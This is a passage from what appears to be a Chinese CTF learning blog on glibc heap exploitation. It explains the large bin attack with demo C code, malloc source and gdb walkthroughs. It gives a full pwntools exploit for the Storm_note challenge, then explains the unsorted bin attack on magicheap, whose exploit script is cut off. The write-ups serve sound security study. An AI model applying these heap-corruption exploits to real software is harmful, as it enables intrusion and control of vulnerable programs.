]\n\n&quot;</span>, (void *)(p3 - <span class="number">2</span>), (void *)(p3[<span class="number">0</span>]));</span><br><span class="line"> </span><br><span class="line">    //------------VULNERABILITY-----------</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    fprintf(stderr, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[-<span class="number">1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (unsigned long)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (unsigned long)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    //------------------------------------</span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    fprintf(stderr, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (void *)stack_var1);</span><br><span class="line">    fprintf(stderr, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (void *)stack_var2);</span><br><span class="line"></span><br><span class="line">    // sanity check</span><br><span class="line">    <span class="keyword">assert</span>(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">assert</span>(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="开始结构"><a href="#开始结构" class="headerlink" title="开始结构"></a>开始结构</h3><blockquote><p>首先我们创建完三个堆快后的结构</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410252105264.png" alt="image-20241025210542173"></p><h3 id="挂入unsorted-bin"><a href="#挂入unsorted-bin" class="headerlink" title="挂入unsorted bin"></a>挂入unsorted bin</h3><blockquote><p>接着，我们先释放p1 再释放p2</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410252107295.png" alt="image-20241025210746252"></p><h3 id="第一个malloc"><a href="#第一个malloc" class="headerlink" title="第一个malloc"></a>第一个malloc</h3><blockquote><p>可以看到这两个chunk被挂进了unsorted bin 中</p></blockquote><blockquote><p>然后malloc了一个大小为0x90大小的堆快</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410252111296.png" alt="image-20241025211131249"></p><blockquote><p>此时，我们的结构发生了巨大的变化</p><blockquote><p>1.在molloc时，先把距离large最近的chunk拿出来，大小大于0x400是large bin,并标记为空闲地址</p><p>2.同理,把p2放进large并标记为空闲</p><p>3.因为p1&lt;p2,先把p1拿出来，分出（0x90+0x10）的空间出来，再把剩下的放入unsorted bin中去</p></blockquote></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410252133156.png" alt="image-20241025213354974"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410252134913.png" alt="image-20241025213422842"></p><blockquote><p>接着p3也被free掉了，被挂进了unsort bin中</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410252141227.png"></p><h3 id="改p2-已释放-的堆快信息"><a href="#改p2-已释放-的堆快信息" class="headerlink" title="改p2(已释放)的堆快信息"></a>改p2(已释放)的堆快信息</h3><blockquote><p>接下来，我们把p2的值进行一个改变</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p2[-1] = 0x3f1;                             // p2---&gt;size==0x3f1</span><br><span class="line">p2[0] = 0;                                  // p2---&gt;fd==0</span><br><span class="line">p2[2] = 0;                                  // p2---&gt;bk==0</span><br><span class="line">p2[1] = (unsigned long)(&amp;stack_var1 - 2);   // p2---&gt;fd_nextsize==&amp;stack_var1 - 0x10</span><br><span class="line">p2[3] = (unsigned long)(&amp;stack_var2 - 4);   // p2---&gt;bk_nextsize==&amp;stack_var2 - 0x20</span><br></pre></td></tr></table></figure><p>改完之后gdb的识别就乱了</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410252204599.png" alt="image-20241025220424451"></p><blockquote><p><strong>注意前后这个块的变化</strong></p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410252215325.png" alt="image-20241025221549272"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410252217429.png" alt="image-20241025221719357"></p><blockquote><p>我们再申请一个堆快，可以看到</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410271622753.png" alt="image-20241027162203626"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410271627613.png" alt="image-20241027162740563"></p><p>可以看到，这里原来的0被改成了0x6029a0</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410271931152.png" alt="image-20241027193144087"></p><h3 id="最后那个malloc"><a href="#最后那个malloc" class="headerlink" title="最后那个malloc"></a>最后那个malloc</h3><p>这里我们重点看一下最后一步的malloc这一步发生了什么</p><p>首先我们看看这步前面的bin里面的结构</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410272119364.png" alt="屏幕截图 2024-10-27 211736"></p><p>先把p1拿出来放到了small_bin里面去，接着我们把p3拿出来。发现应该放到large_bin中去，又因为这里原本有个p2,所以，p3应该是要插到large_bin中间去，这时就是这里的关键</p><p>先比较p2和p3大小（越大的bin越靠近large_bin）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">while ((unsigned long) size &lt; fwd-&gt;size)</span><br><span class="line">  &#123;</span><br><span class="line">    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">if ((unsigned long) size == (unsigned long) fwd-&gt;size)</span><br><span class="line">  /* Always insert in the second position.  */</span><br><span class="line">  fwd = fwd-&gt;fd;</span><br></pre></td></tr></table></figure><p>p2我们改成了0x3f0,所以小于p3，这里，我们就要进行一个插入p3到large_bin</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410272137435.png" alt="image-20241027213736352"></p><blockquote><p>在我们还没有插入之前是这样的</p></blockquote><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410272139117.png" alt="image-20241027213910999"></p><blockquote><p>下面是部分源码</p><p>victim是p3</p><p>fwd是p2</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;      //所以我们原来stack_var1就改成了p3</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>附上这部分的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">/* Take now instead of binning if exact fit */</span><br><span class="line"></span><br><span class="line">if (size == nb)</span><br><span class="line">  &#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    if (av != &amp;main_arena)</span><br><span class="line">      victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    void *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    return p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">/* place chunk in bin */</span><br><span class="line"></span><br><span class="line">if (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br><span class="line">else</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    /* maintain large bins in sorted order */</span><br><span class="line">    if (fwd != bck)</span><br><span class="line">      &#123;</span><br><span class="line">        /* Or with inuse bit to speed comparisons */</span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        /* if smaller than smallest, bypass loop below */</span><br><span class="line">        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);</span><br><span class="line">        if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size))</span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">        else</span><br><span class="line">          &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);</span><br><span class="line">            while ((unsigned long) size &lt; fwd-&gt;size)</span><br><span class="line">              &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">            if ((unsigned long) size == (unsigned long) fwd-&gt;size)</span><br><span class="line">              /* Always insert in the second position.  */</span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            else</span><br><span class="line">              &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">              &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    else</span><br><span class="line">      victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>西湖论剑Storm_note</p><p>调试的时候一会是好的，一会又是卡的</p><p>放个exp走了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,mes</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">  p.send(mes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Choice&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x508</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x508</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))<span class="comment">#prev_size</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))<span class="comment">#prev_size</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)<span class="comment">#off by null</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment">#7 0x050</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)    <span class="comment">#overlap</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#recover</span></span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e0</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)<span class="comment">#off by null</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment">#8 0x5a0</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>)<span class="comment">#overlap</span></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#4 0x580</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)    <span class="comment">#unsortedbin-&gt; chunk2 -&gt; chunk5(chunk8)(0x5c0)    which size is largebin FIFO</span></span><br><span class="line">add(<span class="number">0x4e8</span>)      <span class="comment"># put chunk8(0x5c0) to largebin</span></span><br><span class="line">dele(<span class="number">2</span>) <span class="comment">#put chunk2 to unsortedbin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content_addr = <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = content_addr - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment"># size</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment"># bk</span></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) <span class="comment">#size</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)   </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)<span class="comment">#mmap</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span>+p64(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>)*<span class="number">6</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考的博客"><a href="#参考的博客" class="headerlink" title="参考的博客"></a>参考的博客</h1><p><a href="https://hollk.blog.csdn.net/article/details/112825556">好好说话之Large Bin Attack_largebin attack-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn-堆学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>unsortedbin_attack</title>
      <link href="/posts/58747.html"/>
      <url>/posts/58747.html</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>glibc2.23</p><blockquote><p>我们知道当一个chunk大于0x80时,再free掉的时候会进入unsorted_bin （先进先出），这时如果我们通过堆溢出等手段改变这个chunk的bk指针，这样再申请这样的堆块，就可以达到把bk指针的值造成改变</p></blockquote><p><a href="https://hollk.blog.csdn.net/article/details/112589899">好好说话之Unsorted Bin Attack_unsortedbin attack-CSDN博客</a></p><p>这个师傅的图讲这里很清晰，这里借用一下</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410242108795.png" alt="a500a9212e457f5cba3eb4d57b7f462a"></p><p>这是unsortedbin将一个堆块挂入时发生的变化</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410242110302.png" alt="2c4998096039ec7a26e388686c67fbdc"></p><p>这是，我们改变chunk_400的bk指针后再申请堆快回来</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410242112708.png" alt="ee630272364d363097ee989b96b9e9ea"></p><p>可以看到我们可以再target处改写一个字节大小的值</p><h1 id="例题：buu-hitcontraining-magicheap"><a href="#例题：buu-hitcontraining-magicheap" class="headerlink" title="例题：buu hitcontraining_magicheap"></a>例题：buu hitcontraining_magicheap</h1><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410242125758.png" alt="image-20241024212502731"></p><p>保护</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410242124439.png" alt="image-20241024212450367"></p><p>这里其实有个后门，就是magic地址的&gt;4869时，会进入后门</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410242126104.png" alt="image-20241024212630008"></p><p>所以这题的思路很清晰了，就是要改变magic的值</p><p>怎么改变呢，这里要利用之这里堆溢出和unsorted bin 结构</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410242129972.png" alt="image-20241024212942939"></p><p>经典编辑函数时字节溢出漏洞</p><p>我们进入动态调试</p><p>先创建3个堆快，再free掉第二个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CreateHeap(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">CreateHeap(<span class="number">0x80</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">CreateHeap(<span class="number">0x10</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">DeleteHeap(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>因为我们要用unsorted bin所以第二个堆快的大小为0x80</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410242132909.png" alt="image-20241024213251863"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410242133199.png" alt="image-20241024213320173"></p><p>接着我们利用堆溢出改变第二堆快的bk指针</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">magic = <span class="number">0x6020A0</span></span><br><span class="line">EditHeap(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(magic-<span class="number">0x10</span>))</span><br></pre></td></tr></table></figure><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410242134939.png" alt="image-20241024213417898"></p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410242134613.png" alt="image-20241024213432580"></p><p>先看目的magic地址</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410242135817.png" alt="image-20241024213536779"></p><p>现在都是0</p><p>再创建完堆快之后</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202410242136860.png" alt="image-20241024213611838"></p><p>因为我们在申请了一个堆快，因为unsorted bin的指针呗改成的magic-0x10，所以我们申请的堆快在magic-0x10处，而magic被改写成了unsort bin原来的地址</p><p>这个值远远大一4869，所以我们只要按照题目要求输入4869就可以进入bookdoor了</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>[<a href="https://blog.csdn.net/mcmuyanga/article/details/112302849">BUUCTF]PWN——hitcontraining_magicheap-CSDN博客</a></p><p>脚本来源</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,26923)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CreateHeap</span>(<span class="params">size,content</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EditHeap</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span 